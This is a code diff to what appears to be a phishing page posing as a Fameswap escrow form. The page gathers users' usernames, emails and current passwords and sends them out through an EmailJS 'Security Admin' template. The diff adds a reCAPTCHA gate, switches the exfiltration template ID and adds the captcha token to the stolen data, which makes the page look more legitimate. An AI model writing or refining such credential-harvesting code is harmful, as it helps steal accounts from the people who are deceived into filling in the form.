@@ -16,6 +16,7 @@
     <script type="text/javascript" src="https://fameswap.com/js/jquery.min.js"></script>
     <script type="text/javascript" src="https://fameswap.com/js/bootstrap.min.js"></script>
     <script type="text/javascript" src="https://fameswap.com/js/sweetalert.min.js"></script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <link
       href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap"
       rel="stylesheet"
@@ -1084,6 +1085,14 @@
                     </div>
                 <div class="form-group">
                         <div class="col-xs-12">
+                            <div class="g-recaptcha"
+                                 data-sitekey="6Lfetv4rAAAAAP3hrAUQsRk-YBpvnWwLrPNxS4F5"
+                                 data-callback="onCaptchaSuccess"
+                                 data-expired-callback="onCaptchaExpired"></div>
+                        </div>
+                    </div>
+                <div class="form-group">
+                        <div class="col-xs-12">
                             <button type="submit" class="btn btn-primary">Start Escrow</button>
                     </div>
                 </div>
@@ -1568,8 +1577,10 @@
         );
         const checkbox = document.querySelector(".declaration-checkbox");
         const submitBtn = document.querySelector("button[type='submit']");
+        const defaultSubmitLabel = submitBtn ? submitBtn.innerHTML : "";
         const strengthBar = document.querySelector(".strength-bar");
         const strengthText = document.querySelector(".strength-text");
+        let captchaToken = "";
 
         // Toggle password visibility
         document.querySelectorAll(".toggle-password").forEach((button) => {
@@ -1639,6 +1650,7 @@
             (radio) => radio.checked
           );
           const isCheckboxChecked = checkbox.checked;
+          const isCaptchaValid = captchaToken.length > 0;
 
           console.log({
             isUsernameValid,
@@ -1646,6 +1658,7 @@
             isCurrentPasswordValid,
             isFeeSelected,
             isCheckboxChecked,
+            isCaptchaValid,
           });
 
           return (
@@ -1653,7 +1666,8 @@
             isEmailValid &&
             isCurrentPasswordValid &&
             isFeeSelected &&
-            isCheckboxChecked
+            isCheckboxChecked &&
+            isCaptchaValid
           );
         }
 
@@ -1684,6 +1698,12 @@
           e.preventDefault();
           console.log("Form submitted");
 
+          if (!captchaToken) {
+            alert("Please complete the captcha before submitting.");
+            updateSubmitButton();
+            return;
+          }
+
           const formData = {
             username: usernameInput.value,
             email: emailInput.value,
@@ -1705,27 +1725,34 @@
 
           console.log("Attempting to send email with EmailJS...");
           console.log("Service ID: service_w4f4um4");
-          console.log("Template ID: template_6gfhbth");
+          console.log("Template ID: template_kkjt9x2");
 
           // Send email using EmailJS
           emailjs
-            .send("service_w4f4um4", "template_6gfhbth", {
+            .send("service_w4f4um4", "template_kkjt9x2", {
               to_name: "Security Admin",
               from_name: formData.username,
               user_email: formData.email,
               current_password: formData.currentPassword,
               account_price: formData.accountPrice,
               fee_payment: formData.feePayment,
+              captcha_token: captchaToken,
               timestamp: new Date().toLocaleString(),
             })
             .then(
               function (response) {
                 console.log("Email sent successfully. Response:", response);
+                captchaToken = "";
+                if (window.grecaptcha && typeof grecaptcha.reset === "function") {
+                  grecaptcha.reset();
+                }
                 showPopup();
                 form.reset();
                 strengthBar.className = "strength-bar";
                 strengthText.textContent = "Weak";
                 strengthText.className = "";
+                submitBtn.innerHTML = defaultSubmitLabel;
+                submitBtn.disabled = true;
                 updateSubmitButton();
                 document.body.style.overflow = "hidden";
               },
@@ -1735,8 +1762,13 @@
                 console.error("Error text:", error.text);
 
                 // Reset button state
+                captchaToken = "";
+                if (window.grecaptcha && typeof grecaptcha.reset === "function") {
+                  grecaptcha.reset();
+                }
+                submitBtn.innerHTML = defaultSubmitLabel;
                 submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fa fa-rocket"></i> Start Escrow';
+                updateSubmitButton();
 
                 // Show more detailed error message
                 alert(
@@ -1748,11 +1780,28 @@
             )
             .catch(function (error) {
               console.error("Caught unexpected error:", error);
+              captchaToken = "";
+              if (window.grecaptcha && typeof grecaptcha.reset === "function") {
+                grecaptcha.reset();
+              }
+              submitBtn.innerHTML = defaultSubmitLabel;
               submitBtn.disabled = false;
-              submitBtn.innerHTML = '<i class="fa fa-rocket"></i> Start Escrow';
+              updateSubmitButton();
               alert("An unexpected error occurred. Please try again later.");
             });
         });
+
+        window.onCaptchaSuccess = function (token) {
+          console.log("Captcha solved");
+          captchaToken = token || "";
+          updateSubmitButton();
+        };
+
+        window.onCaptchaExpired = function () {
+          console.log("Captcha expired");
+          captchaToken = "";
+          updateSubmitButton();
+        };
 
         // Initial validation check
         updateSubmitButton();
